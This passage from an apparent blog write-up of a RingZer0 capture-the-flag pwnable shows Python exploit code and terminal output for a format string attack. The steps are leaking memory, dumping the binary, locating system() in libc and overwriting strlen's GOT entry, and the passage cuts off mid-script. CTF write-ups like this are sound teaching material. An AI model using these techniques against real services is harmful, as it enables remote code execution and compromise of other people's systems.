</span><span class='line'>  <span class="k">return</span> <span class="n">addr</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">grab_value_indirectly</span><span class="p">(</span><span class="n">i</span><span class="p">):</span>
</span><span class='line'>  <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;pwn01.ringzer0team.com&#39;</span><span class="p">,</span> <span class="mi">13377</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;%&#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;$s</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
</span><span class='line'>  <span class="n">addr</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">split</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'>  <span class="c"># ugly workaround, only grab 8 bytes. will fix this later!</span>
</span><span class='line'>  <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">8</span><span class="p">:</span>
</span><span class='line'>      <span class="n">address</span> <span class="o">=</span> <span class="n">addr</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">8</span><span class="p">]</span>
</span><span class='line'>  <span class="k">else</span><span class="p">:</span>
</span><span class='line'>      <span class="n">address</span> <span class="o">=</span> <span class="n">addr</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\x00</span><span class="s">&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">8</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">addr</span><span class="p">))</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&#39;L&#39;</span><span class="p">,</span> <span class="n">address</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">write_byte_value_via</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">value</span><span class="p">):</span>
</span><span class='line'>  <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;pwn01.ringzer0team.com&#39;</span><span class="p">,</span> <span class="mi">13377</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;%&#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">value</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;c%&#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;$hhn</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">read_from_address</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">offset</span><span class="p">):</span>
</span><span class='line'>  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
</span><span class='line'>      <span class="n">b</span> <span class="o">=</span> <span class="p">(</span><span class="n">addr</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span>
</span><span class='line'>      <span class="n">addr</span> <span class="o">&gt;&gt;=</span> <span class="mi">8</span>
</span><span class='line'>      <span class="k">if</span> <span class="n">b</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span><span class='line'>          <span class="n">b</span> <span class="o">=</span> <span class="mi">256</span>
</span><span class='line'>      <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span><span class='line'>          <span class="n">i</span> <span class="o">=</span> <span class="mi">256</span>
</span><span class='line'>      <span class="n">write_byte_value_via</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>      <span class="c"># change address</span>
</span><span class='line'>      <span class="n">write_byte_value_via</span><span class="p">(</span><span class="mi">636</span><span class="p">,</span> <span class="n">b</span><span class="p">)</span>    <span class="c"># write byte</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">dump1</span> <span class="o">=</span> <span class="n">grab_value_indirectly</span><span class="p">(</span><span class="mi">636</span><span class="o">+</span><span class="n">offset</span><span class="p">)</span>
</span><span class='line'>  <span class="k">return</span> <span class="nb">hex</span><span class="p">(</span><span class="n">dump1</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">parameter_636_addr</span> <span class="o">=</span> <span class="n">grab_value_directly</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;parameter 5 points to: &quot;</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">parameter_636_addr</span><span class="p">)</span>
</span><span class='line'><span class="n">value_at_636</span> <span class="o">=</span> <span class="n">grab_value_indirectly</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;address pointed to by parameter 5 contains: &quot;</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">value_at_636</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">value_at_scratch</span> <span class="o">=</span> <span class="n">grab_value_indirectly</span><span class="p">(</span><span class="mi">636</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;scratch contains: &quot;</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">value_at_scratch</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">format_offset</span> <span class="o">=</span> <span class="p">((</span><span class="n">value_at_636</span> <span class="o">&amp;</span> <span class="mh">0xffffffffffffff00</span><span class="p">)</span> <span class="o">-</span> <span class="n">parameter_636_addr</span><span class="p">)</span><span class="o">/</span><span class="mi">8</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;scratch is parameter {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="mi">636</span><span class="o">+</span><span class="n">format_offset</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;read from 0x400000: {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">read_from_address</span><span class="p">(</span><span class="mh">0x400000</span><span class="p">,</span> <span class="n">format_offset</span><span class="p">))</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/ringzer0ctf/pwnable-linux/5<span class="nv">$ </span>python sploit3.py
</span><span class='line'>parameter <span class="m">5</span> points to:  0x7fff3ca480d8
</span><span class='line'>address pointed to by parameter <span class="m">5</span> contains:  0x7fff3ca49f01
</span><span class='line'>scratch contains:  0x7369
</span><span class='line'>scratch is parameter 1601
</span><span class='line'><span class="nb">read </span>from 0x400000: 0x10102464c457f
</span></code></pre></td></tr></table></div></figure>


<p>Indeed, this dumps out the ELF header&rsquo;s magic bytes! By this time, I noticed that trying to read from an address that contains a NULL byte as the first byte, returns 0x7369. I used this in the dumper to identify NULL bytes.</p>

<p>From here on out, I adjusted the script to dump out the entire binary. It was a slow process, but I managed to speed it up a bit by not having it write out the full address each time, and dumping as much bytes as possible (I adjusted the <code>grab_value_indirectly</code>). The problem with the dumping process via <code>sprintf</code> is that it stops dumping bytes when it hits a <code>0x0a</code>, <code>0x0d</code> or <code>0x00</code> byte. I have no way of knowing which one it actually is, so I assumed NULL bytes. This gave me an imperfect dump, which I could not run and <code>readelf</code> could not make heads or tails of the section headers.</p>

<p>This meant that I had no way of knowing exactly where each GOT entry was, and which function address each entry held. Reverse engineering the dumped binary provided an alternative. I was looking at the output of <code>xxd</code> and noticed the following:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>...snip...
</span><span class='line'>00014a0: ffc7 <span class="m">8580</span> edff ff41 <span class="m">4141</span> 41c7 <span class="m">8584</span> edff  .......AAAA.....
</span><span class='line'>00014b0: <span class="m">0042</span> <span class="m">4242</span> 42c7 <span class="m">8588</span> edff ff43 <span class="m">4343</span> 43c6  .BBBB......CCCC
</span><span class='line'>...snip...
</span></code></pre></td></tr></table></div></figure>


<p>This looks familiar, doesn&rsquo;t it?</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">char</span> <span class="n">test</span><span class="p">[]</span> <span class="o">=</span> <span class="s">&quot;AAAABBBBCCCC&quot;</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>I out those bytes, starting at 0x1260, and ran the resulting string through <code>rasm2</code>. This gave me the raw bytes:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>xxd -c <span class="m">1</span> dump <span class="p">|</span>grep <span class="m">1260</span> -A512 <span class="p">|</span> awk <span class="s1">&#39;{print $2}&#39;</span> <span class="p">|</span>tr -d <span class="s1">&#39;\n&#39;</span>
</span><span class='line'>b800000000e8b6f8ffffc78540edffff48460052c78544edffff656d6f74c78548edffff
</span><span class='line'>65005365c7854cedffff63757265c78550edffff00536865c78554edffff6c6c005bc785
</span><span class='line'>...snip...
</span></code></pre></td></tr></table></div></figure>


<p>I ran this output through <code>rasm2</code> to show the corresponding assembly code. I put in the correct starting address for rasm2. This is the address of the start of the binary (0x400000) plus the offset from which I&rsquo;ve dumped, 0x1260. A bit of reverse-engineering led me to identify <code>malloc</code>, <code>memset</code> and <code>strlen</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span><span class="nb">echo</span> <span class="s1">&#39;b800...&#39;</span> <span class="p">|</span> rasm2 -d -b <span class="m">64</span> -o 0x401260 -
</span><span class='line'>
</span><span class='line'>mov dword <span class="o">[</span>rbp-0x50<span class="o">]</span>, 0x0
</span><span class='line'>mov eax, <span class="o">[</span>rbp-0x20<span class="o">]</span>
</span><span class='line'>cmp eax, <span class="o">[</span>rbp-0x1c<span class="o">]</span>
</span><span class='line'>jnz dword 0x4015d1
</span><span class='line'>// char *response <span class="o">=</span> NULL<span class="p">;</span>
</span><span class='line'>mov qword <span class="o">[</span>rbp-0x58<span class="o">]</span>, 0x0       
</span><span class='line'>// char *cleanBuffer <span class="o">=</span> NULL<span class="p">;</span>
</span><span class='line'>mov qword <span class="o">[</span>rbp-0x60<span class="o">]</span>, 0x0   
</span><span class='line'>// <span class="nv">response</span> <span class="o">=</span> <span class="o">(</span>char*<span class="o">)</span>malloc<span class="o">(</span>2048<span class="o">)</span><span class="p">;</span>  
</span><span class='line'>mov edi, 0x800                    
</span><span class='line'>call dword 0x400ba0               
</span><span class='line'>mov <span class="o">[</span>rbp-0x58<span class="o">]</span>, rax
</span><span class='line'>// memset<span class="o">(</span>response, 0, 2048<span class="o">)</span><span class="p">;</span>
</span><span class='line'>mov rax, <span class="o">[</span>rbp-0x58<span class="o">]</span>
</span><span class='line'>mov edx, 0x800
</span><span class='line'>mov esi, 0x0
</span><span class='line'>mov rdi, rax
</span><span class='line'>call dword 0x400b40
</span><span class='line'>// <span class="nv">cleanBuffer</span> <span class="o">=</span> <span class="o">(</span>char*<span class="o">)</span>malloc<span class="o">(</span>strlen<span class="o">(</span>buf<span class="o">))</span><span class="p">;</span>
</span><span class='line'>lea rax, <span class="o">[</span>rbp-0x11f0<span class="o">]</span>
</span><span class='line'>mov rdi, rax
</span><span class='line'>call dword 0x400b00   
</span><span class='line'>mov rdi, rax
</span><span class='line'>call dword 0x400ba0
</span><span class='line'>mov <span class="o">[</span>rbp-0x60<span class="o">]</span>, rax
</span><span class='line'>lea rax, <span class="o">[</span>rbp-0x11f0<span class="o">]</span>
</span></code></pre></td></tr></table></div></figure>


<p>Now, these calls go to the PLT, which uses an address located in the GOT to do the actual library call. From the disassembly and the raw bytes, I was able to find out to which memory address the calls go. For example, let&rsquo;s find the address of the GOT entry for <code>strlen</code>. From the disassembly provided above, I know it&rsquo;s PLT stub is at <code>0x400b00</code>, so dumping from <code>0xb00</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>0000b00: ff25 fa0f <span class="m">0000</span> <span class="m">6807</span> <span class="m">0000</span> 00e9 70ff ffff  .%....h.....p...
</span></code></pre></td></tr></table></div></figure>


<p>This disassembles to</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>rasm2 -d -b <span class="m">64</span> -o 0x400b00 -
</span><span class='line'>ff25fa0f0000
</span><span class='line'>jmp qword <span class="o">[</span>rip+0xffa<span class="o">]</span>
</span></code></pre></td></tr></table></div></figure>


<p>So it actually references the QWORD at <code>0x400b00</code> + <code>6</code> + <code>0x0ffa</code>, which is <code>0x401b00</code>. This made no sense to me, and it still doesn&rsquo;t. I know for a fact that the GOT is actually at <code>0x60xxxx</code>, so I took a chance and dumped the bytes from that location. This indeed contained a libc address! Assuming my reversing skills are okay, I have a way to read two libc addresses to two known functions! This would allow me to identify which libc version is in use and get me one step closer to my goal of shelling this challenge out.</p>

<h2>libc Version: Computer Says No</h2>

<p>To identify the libc version in use, I&rsquo;d need two libc addresses and the corresponding function names. I could compare the difference of these addresses to those found on the libc binaries I had. I used my <a href="https://gist.github.com/barrebas/e99194a4ac8b5252773c">own little script</a> for this. Alas, I found no exact match, even though I had downloaded all the libc versions that Debian provided. It did seem, however, that the libc in use on the remote box was very similar to <a href="https://packages.debian.org/wheezy/amd64/libc-bin/download">libc 2.13-38</a>. This gave me a handle and soon I was dumping from libc. I did this by first grabbing <code>strlen</code> from the GOT, and then subtracting the offset of <code>strlen</code>. This yielded a wrong libc base, but it was good enough to use a reference in combination with libc-2.13-38.</p>

<p>I decided to look for <code>system()</code> the old fashioned way: by dumping all the bytes from the <code>libc_base + system_offset_in_libc-2.13</code> - 0x1000 to +0x1000. In these bytes, I found <code>system()</code> at -0x90:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>0000f70: <span class="m">5348</span> 83ec <span class="m">1048</span> 85ff <span class="m">7416</span> 8b05 4ca9 <span class="m">3400</span>  SH...H..t...L.4.
</span><span class='line'>0000f80: 85c0 <span class="m">7526</span> <span class="m">4883</span> c410 5be9 82fb ffff <span class="m">6690</span>  ..u<span class="p">&amp;</span>H...<span class="o">[</span>.....f.
</span></code></pre></td></tr></table></div></figure>


<p>You see, <code>system()</code> in libc 2.13 looks like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>objdump -d -M intel libc-2.13.so <span class="p">|</span>grep system -A10
</span><span class='line'>
</span><span class='line'>000000000003fc70 &lt;__libc_system&gt;:
</span><span class='line'>   3fc70: <span class="m">53</span>                      push   rbx
</span><span class='line'>   3fc71: <span class="m">48</span> <span class="m">83</span> ec <span class="m">10</span>             sub    rsp,0x10
</span><span class='line'>   3fc75: <span class="m">48</span> <span class="m">85</span> ff                <span class="nb">test   </span>rdi,rdi
</span><span class='line'>   3fc78: <span class="m">74</span> <span class="m">16</span>                   je     3fc90 &lt;__libc_system+0x20&gt;
</span><span class='line'>   3fc7a: 8b <span class="m">05</span> 6c b9 <span class="m">34</span> <span class="m">00</span>       mov    eax,DWORD PTR <span class="o">[</span>rip+0x34b96c<span class="o">]</span>        <span class="c"># 38b5ec &lt;argp_program_version_hook+0x1b4&gt;</span>
</span><span class='line'>   3fc80: <span class="m">85</span> c0                   <span class="nb">test   </span>eax,eax
</span><span class='line'>   3fc82: <span class="m">75</span> <span class="m">26</span>                   jne    3fcaa &lt;__libc_system+0x3a&gt;
</span><span class='line'>   3fc84: <span class="m">48</span> <span class="m">83</span> c4 <span class="m">10</span>             add    rsp,0x10
</span><span class='line'>   3fc88: 5b                      pop    rbx
</span><span class='line'>   3fc89: e9 <span class="m">82</span> fb ff ff          jmp    3f810 &lt;__strtold_l+0x10&gt;
</span><span class='line'>   3fc8e: <span class="m">66</span> <span class="m">90</span>                   xchg   ax,ax
</span></code></pre></td></tr></table></div></figure>


<p>That&rsquo;s a perfect match! I had the address of system. I turned my attention to overwriting a GOT entry. I settled on overwriting <code>strlen</code>&rsquo;s GOT entry. After the overwriting was done, the next connection would use my <code>buf</code> as input for <code>system()</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">cleanBuffer</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">strlen</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>
</span><span class='line'><span class="c1">// disassembly:</span>
</span><span class='line'><span class="n">lea</span> <span class="n">rax</span><span class="p">,</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x11f0</span><span class="p">]</span>
</span><span class='line'><span class="n">mov</span> <span class="n">rdi</span><span class="p">,</span> <span class="n">rax</span>
</span><span class='line'><span class="n">call</span> <span class="n">dword</span> <span class="mh">0x400b00</span> <span class="o">&lt;</span> <span class="n">the</span> <span class="n">GOT</span> <span class="n">entry</span> <span class="k">for</span> <span class="n">strlen</span> <span class="n">will</span> <span class="n">be</span> <span class="n">pointing</span> <span class="n">to</span> <span class="n">system</span><span class="o">!</span>
</span></code></pre></td></tr></table></div></figure>


<p>The addresses for <code>strlen</code> and <code>system</code> only differed in the last three bytes. Therefore, I had to figure out a way to write three bytes at the same time; if I overwrote one byte each time, then by the time I connected to overwrite the second byte, I&rsquo;d get a crash. This is because the GOT entry for strlen would be pointing to a rather random memory location!</p>

<p>So, writing three bytes at once requires three memory address to be present on the stack, which can be addressed directly. From there, I again used the <code>%&lt;number&gt;%&lt;offset&gt;$hhn</code> primitive to write a byte.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">def</span> <span class="nf">write_on_stack</span><span class="p">(</span><span class="n">what</span><span class="p">,</span> <span class="n">where</span><span class="p">,</span> <span class="n">offset</span><span class="p">):</span>
</span><span class='line'>  <span class="c"># write out all the bytes of what</span>
</span><span class='line'>  <span class="c"># used to write addresses on the stack</span>
</span><span class='line'>  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
</span><span class='line'>      <span class="n">b</span> <span class="o">=</span> <span class="p">(</span><span class="n">what</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span>
</span><span class='line'>      <span class="n">what</span> <span class="o">&gt;&gt;=</span> <span class="mi">8</span>
</span><span class='line'>      <span class="k">if</span> <span class="n">b</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span><span class='line'>          <span class="n">b</span> <span class="o">=</span> <span class="mi">256</span>
</span><span class='line'>      <span class="k">if</span> <span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="n">where</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span><span class='line'>          <span class="n">i</span> <span class="o">=</span> <span class="mi">256</span>
</span><span class='line'>      <span class="n">write_byte_value_via</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="n">i</span><span class="o">+</span><span class="n">where</span><span class="p">)</span>
</span><span class='line'>      <span class="n">write_byte_value_via</span><span class="p">(</span><span class="mi">636</span><span class="p">,</span> <span class="n">b</span><span class="p">)</span>
</span><span class='line'>  <span class="k">print</span> <span class="s">&quot;[+] wrote {} to {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">grab_value_directly</span><span class="p">(</span><span class="mi">636</span><span class="o">+</span><span class="n">offset</span><span class="o">+</span><span class="n">where</span><span class="o">/</span><span class="mi">8</span><span class="p">)),</span> <span class="mi">636</span><span class="o">+</span><span class="n">offset</span><span class="o">+</span><span class="n">where</span><span class="o">/</span><span class="mi">8</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">parameter_636_addr</span> <span class="o">=</span> <span class="n">grab_value_directly</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;parameter 5 points to: &quot;</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">parameter_636_addr</span><span class="p">)</span>
</span><span class='line'><span class="n">value_at_636</span> <span class="o">=</span> <span class="n">grab_value_indirectly</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;address pointed to by parameter 5 contains: &quot;</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">value_at_636</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">value_at_scratch</span> <span class="o">=</span> <span class="n">grab_value_indirectly</span><span class="p">(</span><span class="mi">636</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;scratch contains: &quot;</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">value_at_scratch</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">format_offset</span> <span class="o">=</span> <span class="p">((</span><span class="n">value_at_636</span> <span class="o">&amp;</span> <span class="mh">0xffffffffffffff00</span><span class="p">)</span> <span class="o">-</span> <span class="n">parameter_636_addr</span><span class="p">)</span><span class="o">/</span><span class="mi">8</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;scratch is parameter {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="mi">636</span><span class="o">+</span><span class="n">format_offset</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># grab strlen from the GOT entry</span>
</span><span class='line'><span class="n">strlen_addr</span> <span class="o">=</span> <span class="n">read_from_address</span><span class="p">(</span><span class="mh">0x601b00</span><span class="p">,</span> <span class="n">format_offset</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[+] strlen is at {}.&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">strlen_addr</span><span class="p">))</span>
</span><span class='line'><span class="c"># from libc-2.13-38 -- NOT CORRECT</span>
</span><span class='line'><span class="n">libc_base</span> <span class="o">=</span> <span class="n">strlen_addr</span> <span class="o">-</span> <span class="mh">0x80b70</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[+] libc_base is at {}.&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="c"># we need to have three addresses on the stack which we can directly address</span>
</span><span class='line'><span class="c"># to use them in the format string vuln </span>
</span><span class='line'><span class="n">write_on_stack</span><span class="p">(</span><span class="mh">0x601e20</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">format_offset</span><span class="p">)</span>
</span><span class='line'><span class="n">write_on_stack</span><span class="p">(</span><span class="mh">0x601e21</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="n">format_offset</span><span class="p">)</span>
</span><span class='line'><span class="n">write_on_stack</span><span class="p">(</span><span class="mh">0x601e22</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="n">format_offset</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># ok, now try to set three bytes in one go</span>
</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;pwn01.ringzer0team.com&#39;</span><span class="p">,</span> <span class="mi">13377</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="c"># should write out &quot;BAS&quot; in one go</span>
